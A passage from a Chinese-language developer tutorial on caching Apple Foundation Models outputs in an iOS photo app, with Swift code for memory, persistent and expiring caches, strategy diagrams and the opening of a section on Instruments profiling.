        <span class="hljs-keyword">return</span> components.joined(separator: <span class="hljs-string">"|"</span>)  
    }  
      
    <span class="hljs-comment">/// 为自然语言搜索生成缓存键  </span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">keyForSearch</span>(  
        <span class="hljs-params">query</span>: <span class="hljs-type">String</span>,  
        <span class="hljs-params">photoCount</span>: <span class="hljs-type">Int</span>  
    ) -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-comment">// 使用查询内容和照片数量作为键  </span>
        <span class="hljs-comment">// 注意：如果相册内容变化，需要使缓存失效  </span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"search:<span class="hljs-subst">\(query.hashValue)</span>:<span class="hljs-subst">\(photoCount)</span>"</span>  
    }  
}  
</code></pre>
<h5 data-id="heading-63">内存缓存实现</h5>
<p><strong>基础内存缓存</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryCache</span>&lt;<span class="hljs-title class_">T</span>: <span class="hljs-title class_">Codable</span>&gt; {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cache: [<span class="hljs-type">String</span>: <span class="hljs-type">CacheEntry</span>&lt;<span class="hljs-type">T</span>&gt;] <span class="hljs-operator">=</span> [:]  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxSize: <span class="hljs-type">Int</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> accessQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.app.cache"</span>, attributes: .concurrent)  
      
    <span class="hljs-keyword">init</span>(<span class="hljs-params">maxSize</span>: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>) {  
        <span class="hljs-keyword">self</span>.maxSize <span class="hljs-operator">=</span> maxSize  
    }  
      
    <span class="hljs-comment">/// 获取缓存  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">T</span>? {  
        <span class="hljs-keyword">return</span> accessQueue.sync {  
            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> entry <span class="hljs-operator">=</span> cache[key] <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> }  
              
            <span class="hljs-comment">// 更新访问时间（用于LRU）  </span>
            entry.lastAccessed <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()  
            <span class="hljs-keyword">return</span> entry.value  
        }  
    }  
      
    <span class="hljs-comment">/// 设置缓存  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {  
        accessQueue.async(flags: .barrier) {  
            <span class="hljs-comment">// 如果缓存已满，执行淘汰策略  </span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.cache.count <span class="hljs-operator">&gt;=</span> <span class="hljs-keyword">self</span>.maxSize <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-keyword">self</span>.cache[key] <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> {  
                <span class="hljs-keyword">self</span>.evictOldest()  
            }  
              
            <span class="hljs-keyword">self</span>.cache[key] <span class="hljs-operator">=</span> <span class="hljs-type">CacheEntry</span>(value: value, lastAccessed: <span class="hljs-type">Date</span>())  
        }  
    }  
      
    <span class="hljs-comment">/// LRU淘汰：移除最久未访问的条目  </span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">evictOldest</span>() {  
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> oldest <span class="hljs-operator">=</span> cache.min(by: { <span class="hljs-variable">$0</span>.value.lastAccessed <span class="hljs-operator">&lt;</span> <span class="hljs-variable">$1</span>.value.lastAccessed }) <span class="hljs-keyword">else</span> {  
            <span class="hljs-keyword">return</span>  
        }  
        cache.removeValue(forKey: oldest.key)  
    }  
      
    <span class="hljs-comment">/// 清除所有缓存  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">clear</span>() {  
        accessQueue.async(flags: .barrier) {  
            <span class="hljs-keyword">self</span>.cache.removeAll()  
        }  
    }  
      
    <span class="hljs-comment">/// 获取缓存统计  </span>
    <span class="hljs-keyword">var</span> stats: <span class="hljs-type">CacheStats</span> {  
        <span class="hljs-keyword">return</span> accessQueue.sync {  
            <span class="hljs-type">CacheStats</span>(  
                size: cache.count,  
                maxSize: maxSize,  
                hitRate: <span class="hljs-number">0</span> <span class="hljs-comment">// 需要额外实现命中率统计  </span>
            )  
        }  
    }  
}

<span class="hljs-comment">/// 缓存条目  </span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEntry</span>&lt;<span class="hljs-title class_">T</span>&gt; {  
    <span class="hljs-keyword">let</span> value: <span class="hljs-type">T</span>  
    <span class="hljs-keyword">var</span> lastAccessed: <span class="hljs-type">Date</span>  
    <span class="hljs-keyword">var</span> accessCount: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>  
      
    <span class="hljs-keyword">init</span>(<span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">lastAccessed</span>: <span class="hljs-type">Date</span>) {  
        <span class="hljs-keyword">self</span>.value <span class="hljs-operator">=</span> value  
        <span class="hljs-keyword">self</span>.lastAccessed <span class="hljs-operator">=</span> lastAccessed  
    }  
}

<span class="hljs-comment">/// 缓存统计  </span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">CacheStats</span> {  
    <span class="hljs-keyword">let</span> size: <span class="hljs-type">Int</span>  
    <span class="hljs-keyword">let</span> maxSize: <span class="hljs-type">Int</span>  
    <span class="hljs-keyword">let</span> hitRate: <span class="hljs-type">Double</span>  
}  
</code></pre>
<p><strong>使用内存缓存的完整示例</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedPhotoAnalysisService</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> cache <span class="hljs-operator">=</span> <span class="hljs-type">MemoryCache</span>&lt;<span class="hljs-type">PhotoDescription</span>&gt;(maxSize: <span class="hljs-number">100</span>)  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> sessionManager <span class="hljs-operator">=</span> <span class="hljs-type">PhotoAISessionManager</span>()  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhoto</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
        <span class="hljs-comment">// 生成缓存键  </span>
        <span class="hljs-keyword">let</span> cacheKey <span class="hljs-operator">=</span> <span class="hljs-type">CacheKeyBuilder</span>.keyForPhotoAnalysis(  
            photoId: photo.id,  
            modificationDate: photo.modificationDate  
        )  
          
        <span class="hljs-comment">// 检查缓存  </span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> cached <span class="hljs-operator">=</span> cache.get(for: cacheKey) {  
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 缓存命中: <span class="hljs-subst">\(cacheKey)</span>"</span>)  
            <span class="hljs-keyword">return</span> cached  
        }  
          
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 缓存未命中，生成新结果: <span class="hljs-subst">\(cacheKey)</span>"</span>)  
          
        <span class="hljs-comment">// 生成新结果  </span>
        <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> generateAnalysisPrompt(for: photo)  
        <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> sessionManager.generateStructured(  
            prompt: prompt,  
            type: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
        )  
          
        <span class="hljs-comment">// 存储到缓存  </span>
        cache.set(result, for: cacheKey)  
          
        <span class="hljs-keyword">return</span> result  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">generateAnalysisPrompt</span>(<span class="hljs-params">for</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-comment">// 生成分析提示词  </span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"分析照片..."</span>  
    }  
}  
</code></pre>
<h5 data-id="heading-64">持久化缓存实现</h5>
<p>对于需要跨应用启动保持的缓存，可以使用文件系统持久化：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PersistentCache</span>&lt;<span class="hljs-title class_">T</span>: <span class="hljs-title class_">Codable</span>&gt; {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> memoryCache <span class="hljs-operator">=</span> <span class="hljs-type">MemoryCache</span>&lt;<span class="hljs-type">T</span>&gt;(maxSize: <span class="hljs-number">50</span>)  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> cacheDirectory: <span class="hljs-type">URL</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> fileManager <span class="hljs-operator">=</span> <span class="hljs-type">FileManager</span>.default  
      
    <span class="hljs-keyword">init</span>(<span class="hljs-params">cacheName</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">throws</span> {  
        <span class="hljs-keyword">let</span> cacheDir <span class="hljs-operator">=</span> fileManager.urls(for: .cachesDirectory, in: .userDomainMask)[<span class="hljs-number">0</span>]  
        cacheDirectory <span class="hljs-operator">=</span> cacheDir.appendingPathComponent(cacheName)  
          
        <span class="hljs-comment">// 创建缓存目录  </span>
        <span class="hljs-keyword">try</span> fileManager.createDirectory(at: cacheDirectory, withIntermediateDirectories: <span class="hljs-literal">true</span>)  
    }  
      
    <span class="hljs-comment">/// 获取缓存（先查内存，再查磁盘）  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">T</span>? {  
        <span class="hljs-comment">// 先查内存缓存  </span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> memoryValue <span class="hljs-operator">=</span> memoryCache.get(for: key) {  
            <span class="hljs-keyword">return</span> memoryValue  
        }  
          
        <span class="hljs-comment">// 再查磁盘缓存  </span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> diskValue <span class="hljs-operator">=</span> loadFromDisk(key: key) {  
            <span class="hljs-comment">// 加载到内存缓存  </span>
            memoryCache.set(diskValue, for: key)  
            <span class="hljs-keyword">return</span> diskValue  
        }  
          
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  
    }  
      
    <span class="hljs-comment">/// 设置缓存（同时写入内存和磁盘）  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {  
        <span class="hljs-comment">// 写入内存缓存  </span>
        memoryCache.set(value, for: key)  
          
        <span class="hljs-comment">// 异步写入磁盘  </span>
        <span class="hljs-type">Task</span>.detached(priority: .utility) {  
            <span class="hljs-keyword">self</span>.saveToDisk(value: value, key: key)  
        }  
    }  
      
    <span class="hljs-comment">/// 从磁盘加载  </span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadFromDisk</span>(<span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">T</span>? {  
        <span class="hljs-keyword">let</span> fileURL <span class="hljs-operator">=</span> cacheDirectory.appendingPathComponent(<span class="hljs-string">"<span class="hljs-subst">\(key.hashValue)</span>.json"</span>)  
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try?</span> <span class="hljs-type">Data</span>(contentsOf: fileURL),  
              <span class="hljs-keyword">let</span> value <span class="hljs-operator">=</span> <span class="hljs-keyword">try?</span> <span class="hljs-type">JSONDecoder</span>().decode(<span class="hljs-type">T</span>.<span class="hljs-keyword">self</span>, from: data) <span class="hljs-keyword">else</span> {  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  
        }  
        <span class="hljs-keyword">return</span> value  
    }  
      
    <span class="hljs-comment">/// 保存到磁盘  </span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">saveToDisk</span>(<span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {  
        <span class="hljs-keyword">let</span> fileURL <span class="hljs-operator">=</span> cacheDirectory.appendingPathComponent(<span class="hljs-string">"<span class="hljs-subst">\(key.hashValue)</span>.json"</span>)  
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try?</span> <span class="hljs-type">JSONEncoder</span>().encode(value) <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> }  
        <span class="hljs-keyword">try?</span> data.write(to: fileURL)  
    }  
      
    <span class="hljs-comment">/// 清理过期缓存  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">cleanExpired</span>(<span class="hljs-params">maxAge</span>: <span class="hljs-type">TimeInterval</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-operator">*</span> <span class="hljs-number">24</span> <span class="hljs-operator">*</span> <span class="hljs-number">3600</span>) {  
        <span class="hljs-comment">// 清理超过7天的缓存文件  </span>
        <span class="hljs-comment">// 实现细节...  </span>
    }  
}  
</code></pre>
<h5 data-id="heading-65">缓存失效策略</h5>
<p>缓存失效是缓存策略的重要组成部分，需要根据业务场景选择合适的策略：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Cache[缓存条目] --&gt; Check1{基于时间失效?}  
    Check1 --&gt;|是| TimeBased[时间过期策略 如：7天后失效]  
    Check1 --&gt;|否| Check2{基于数据变化失效?}  
      
    Check2 --&gt;|是| DataBased[数据变化策略 如：照片修改后失效]  
    Check2 --&gt;|否| Check3{基于版本失效?}  
      
    Check3 --&gt;|是| VersionBased[版本策略 如：Instructions变化后失效]  
    Check3 --&gt;|否| Manual[手动失效 用户主动清除]  
      
    TimeBased --&gt; Invalidate[使缓存失效]  
    DataBased --&gt; Invalidate  
    VersionBased --&gt; Invalidate  
    Manual --&gt; Invalidate  
      
    style Cache fill:#007AFF,color:#fff  
    style Check1 fill:#FF9500,color:#fff  
    style Check2 fill:#FF9500,color:#fff  
    style Check3 fill:#FF9500,color:#fff  
    style TimeBased fill:#34C759,color:#fff  
    style DataBased fill:#34C759,color:#fff  
    style VersionBased fill:#34C759,color:#fff  
    style Manual fill:#5AC8FA,color:#000  
    style Invalidate fill:#FF3B30,color:#fff  
</code></pre>
<p><strong>实现带失效策略的缓存</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEntryWithExpiry</span>&lt;<span class="hljs-title class_">T</span>&gt; {  
    <span class="hljs-keyword">let</span> value: <span class="hljs-type">T</span>  
    <span class="hljs-keyword">let</span> createdAt: <span class="hljs-type">Date</span>  
    <span class="hljs-keyword">let</span> expiresAt: <span class="hljs-type">Date</span>?  
      
    <span class="hljs-keyword">init</span>(<span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">ttl</span>: <span class="hljs-type">TimeInterval</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>) {  
        <span class="hljs-keyword">self</span>.value <span class="hljs-operator">=</span> value  
        <span class="hljs-keyword">self</span>.createdAt <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()  
        <span class="hljs-keyword">self</span>.expiresAt <span class="hljs-operator">=</span> ttl.map { <span class="hljs-type">Date</span>().addingTimeInterval(<span class="hljs-variable">$0</span>) }  
    }  
      
    <span class="hljs-keyword">var</span> isExpired: <span class="hljs-type">Bool</span> {  
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> expiresAt <span class="hljs-operator">=</span> expiresAt <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }  
        <span class="hljs-keyword">return</span> <span class="hljs-type">Date</span>() <span class="hljs-operator">&gt;</span> expiresAt  
    }  
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpiringCache</span>&lt;<span class="hljs-title class_">T</span>: <span class="hljs-title class_">Codable</span>&gt; {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cache: [<span class="hljs-type">String</span>: <span class="hljs-type">CacheEntryWithExpiry</span>&lt;<span class="hljs-type">T</span>&gt;] <span class="hljs-operator">=</span> [:]  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxSize: <span class="hljs-type">Int</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> defaultTTL: <span class="hljs-type">TimeInterval</span>?  
      
    <span class="hljs-keyword">init</span>(<span class="hljs-params">maxSize</span>: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>, <span class="hljs-params">defaultTTL</span>: <span class="hljs-type">TimeInterval</span>? <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-operator">*</span> <span class="hljs-number">24</span> <span class="hljs-operator">*</span> <span class="hljs-number">3600</span>) {  
        <span class="hljs-keyword">self</span>.maxSize <span class="hljs-operator">=</span> maxSize  
        <span class="hljs-keyword">self</span>.defaultTTL <span class="hljs-operator">=</span> defaultTTL  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">T</span>? {  
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> entry <span class="hljs-operator">=</span> cache[key] <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> }  
          
        <span class="hljs-comment">// 检查是否过期  </span>
        <span class="hljs-keyword">if</span> entry.isExpired {  
            cache.removeValue(forKey: key)  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  
        }  
          
        <span class="hljs-keyword">return</span> entry.value  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">value</span>: <span class="hljs-type">T</span>, <span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>, <span class="hljs-params">ttl</span>: <span class="hljs-type">TimeInterval</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>) {  
        <span class="hljs-keyword">let</span> entry <span class="hljs-operator">=</span> <span class="hljs-type">CacheEntryWithExpiry</span>(value: value, ttl: ttl <span class="hljs-operator">??</span> defaultTTL)  
          
        <span class="hljs-comment">// 如果缓存已满，移除过期或最旧的条目  </span>
        <span class="hljs-keyword">if</span> cache.count <span class="hljs-operator">&gt;=</span> maxSize <span class="hljs-operator">&amp;&amp;</span> cache[key] <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> {  
            evictExpiredOrOldest()  
        }  
          
        cache[key] <span class="hljs-operator">=</span> entry  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">evictExpiredOrOldest</span>() {  
        <span class="hljs-comment">// 先移除过期的  </span>
        <span class="hljs-keyword">let</span> expiredKeys <span class="hljs-operator">=</span> cache.filter { <span class="hljs-variable">$0</span>.value.isExpired }.map { <span class="hljs-variable">$0</span>.key }  
        expiredKeys.forEach { cache.removeValue(forKey: <span class="hljs-variable">$0</span>) }  
          
        <span class="hljs-comment">// 如果还有空间，不需要继续  </span>
        <span class="hljs-keyword">if</span> cache.count <span class="hljs-operator">&lt;</span> maxSize { <span class="hljs-keyword">return</span> }  
          
        <span class="hljs-comment">// 移除最旧的  </span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> oldest <span class="hljs-operator">=</span> cache.min(by: { <span class="hljs-variable">$0</span>.value.createdAt <span class="hljs-operator">&lt;</span> <span class="hljs-variable">$1</span>.value.createdAt }) {  
            cache.removeValue(forKey: oldest.key)  
        }  
    }  
      
    <span class="hljs-comment">/// 手动使缓存失效  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">invalidate</span>(<span class="hljs-params">for</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {  
        cache.removeValue(forKey: key)  
    }  
      
    <span class="hljs-comment">/// 使所有缓存失效  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">invalidateAll</span>() {  
        cache.removeAll()  
    }  
}  
</code></pre>
<h5 data-id="heading-66">缓存策略选择指南</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((缓存策略选择))  
    内存缓存  
      快速访问  
      适合频繁访问  
      容量有限  
      应用重启后丢失  
    持久化缓存  
      跨启动保持  
      适合重要结果  
      需要磁盘空间  
      需要管理文件  
    缓存失效  
      时间过期  
      数据变化触发  
      版本控制  
      手动清除  
    缓存淘汰  
      LRU 最近最少使用  
      LFU 最不常用  
      FIFO 先进先出  
      根据场景选择  
</code></pre>
<p><strong>不同场景的缓存策略建议</strong>:</p>








































<table><thead><tr><th>场景</th><th>缓存类型</th><th>失效策略</th><th>淘汰策略</th><th>容量建议</th></tr></thead><tbody><tr><td>照片分析结果</td><td>内存+持久化</td><td>照片修改时失效</td><td>LRU</td><td>100-200条</td></tr><tr><td>搜索查询结果</td><td>仅内存</td><td>相册内容变化时失效</td><td>LRU</td><td>50-100条</td></tr><tr><td>相册分类建议</td><td>仅内存</td><td>照片数量变化时失效</td><td>FIFO</td><td>20-50条</td></tr><tr><td>视频摘要</td><td>持久化</td><td>7天过期</td><td>LRU</td><td>50-100条</td></tr></tbody></table>
<h5 data-id="heading-67">缓存最佳实践</h5>
<p><strong>1. 缓存键设计原则</strong></p>
<ul>
<li>✅ 包含所有影响结果的因素</li>
<li>✅ 使用稳定的标识符（如照片ID + 修改时间）</li>
<li>✅ 避免包含易变数据（如当前时间戳）</li>
<li>✅ 考虑哈希冲突，使用足够长的键</li>
</ul>
<p><strong>2. 缓存容量管理</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheManager</span> {  
    <span class="hljs-comment">/// 根据设备内存动态调整缓存大小  </span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">optimalCacheSize</span>() -&gt; <span class="hljs-type">Int</span> {  
        <span class="hljs-keyword">let</span> totalMemory <span class="hljs-operator">=</span> <span class="hljs-type">ProcessInfo</span>.processInfo.physicalMemory  
        <span class="hljs-keyword">let</span> availableMemory <span class="hljs-operator">=</span> totalMemory <span class="hljs-operator">/</span> <span class="hljs-number">4</span> <span class="hljs-comment">// 使用1/4可用内存  </span>
          
        <span class="hljs-comment">// 假设每个缓存条目平均占用 10KB  </span>
        <span class="hljs-keyword">let</span> entrySize <span class="hljs-operator">=</span> <span class="hljs-number">10</span> <span class="hljs-operator">*</span> <span class="hljs-number">1024</span>  
        <span class="hljs-keyword">let</span> maxEntries <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>(availableMemory) <span class="hljs-operator">/</span> entrySize  
          
        <span class="hljs-comment">// 限制在合理范围内  </span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(maxEntries, <span class="hljs-number">500</span>)  
    }  
}  
</code></pre>
<p><strong>3. 缓存性能监控</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheMetrics</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> hits: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> misses: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">recordHit</span>() { hits <span class="hljs-operator">+=</span> <span class="hljs-number">1</span> }  
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">recordMiss</span>() { misses <span class="hljs-operator">+=</span> <span class="hljs-number">1</span> }  
      
    <span class="hljs-keyword">var</span> hitRate: <span class="hljs-type">Double</span> {  
        <span class="hljs-keyword">let</span> total <span class="hljs-operator">=</span> hits <span class="hljs-operator">+</span> misses  
        <span class="hljs-keyword">guard</span> total <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }  
        <span class="hljs-keyword">return</span> <span class="hljs-type">Double</span>(hits) <span class="hljs-operator">/</span> <span class="hljs-type">Double</span>(total)  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">reset</span>() {  
        hits <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  
        misses <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  
    }  
}

<span class="hljs-comment">// 在缓存服务中使用  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedPhotoAnalysisService</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> metrics <span class="hljs-operator">=</span> <span class="hljs-type">CacheMetrics</span>()  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhoto</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
        <span class="hljs-keyword">let</span> cacheKey <span class="hljs-operator">=</span> <span class="hljs-type">CacheKeyBuilder</span>.keyForPhotoAnalysis(<span class="hljs-operator">...</span>)  
          
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> cached <span class="hljs-operator">=</span> cache.get(for: cacheKey) {  
            metrics.recordHit()  
            <span class="hljs-keyword">return</span> cached  
        }  
          
        metrics.recordMiss()  
        <span class="hljs-comment">// ... 生成新结果  </span>
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">getCacheStats</span>() -&gt; (hitRate: <span class="hljs-type">Double</span>, size: <span class="hljs-type">Int</span>) {  
        <span class="hljs-keyword">return</span> (metrics.hitRate, cache.stats.size)  
    }  
}  
</code></pre>
<p><strong>4. 缓存检查清单</strong></p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 缓存键是否包含所有影响结果的因素？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否实现了合适的失效策略？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 缓存容量是否合理（不会导致内存压力）？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否监控了缓存命中率？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否处理了缓存失败的情况？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否需要持久化缓存（跨启动保持）？</li>
</ul>
<p><strong>参考资源</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonevcat.com%2F2025%2F06%2Ffoundation-models%2F" target="_blank" title="https://onevcat.com/2025/06/foundation-models/" ref="nofollow noopener noreferrer">OneV's Den - Foundation Models 内存分析</a></li>
</ul>
<h4 data-id="heading-68">使用 Instruments 进行性能分析</h4>
<p><strong>Instruments</strong> 是 Apple 提供的性能分析工具，最新版本已添加 <strong>Foundation Models 模块</strong>，可以在 iPhone 设备上直接进行性能分析，帮助开发者优化应用性能。</p>
<h5 data-id="heading-69">Instruments Foundation Models 模块功能</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([启动 Instruments]) --&gt; Select[选择 Foundation Models 模板]  
    Select --&gt; Connect[连接 iPhone 设备]  
    Connect --&gt; Launch[启动应用]  
    Launch --&gt; Record[开始录制性能数据]  
    Record --&gt; Analyze[分析性能指标]  
      
    Analyze --&gt; LoadTime[模型加载时间分析]  
    Analyze --&gt; InferenceTime[推理时间分析]  
    Analyze --&gt; TokenCount[输入令牌数量分析]  
    Analyze --&gt; Memory[内存使用分析]  
      
    LoadTime --&gt; Optimize1[优化加载策略]  
    InferenceTime --&gt; Optimize2[优化 Prompt 设计]  
    TokenCount --&gt; Optimize3[优化输入长度]  
    Memory --&gt; Optimize4[优化内存管理]  
      
    style Start fill:#007AFF,color:#fff  
    style Select fill:#5AC8FA,color:#000  
    style Connect fill:#5AC8FA,color:#000  
    style Record fill:#FF9500,color:#fff  
    style Analyze fill:#FF9500,color:#fff  
    style LoadTime fill:#34C759,color:#fff  
    style InferenceTime fill:#34C759,color:#fff  
    style TokenCount fill:#34C759,color:#fff  
    style Memory fill:#34C759,color:#fff  
</code></pre>
<p><strong>核心分析指标</strong>:</p>
<ol>
<li>
<p><strong>模型加载时间（Model Load Time）</strong><br/>
- 测量模型从存储加载到内存并准备就绪的时间<br/>
- 帮助识别首次调用延迟问题<br/>
- 优化建议：预热模型、优化存储位置</p>
</li>
<li>
<p><strong>推理时间（Inference Time）</strong><br/>
- 测量模型接收输入并生成输出所需的时间<br/>
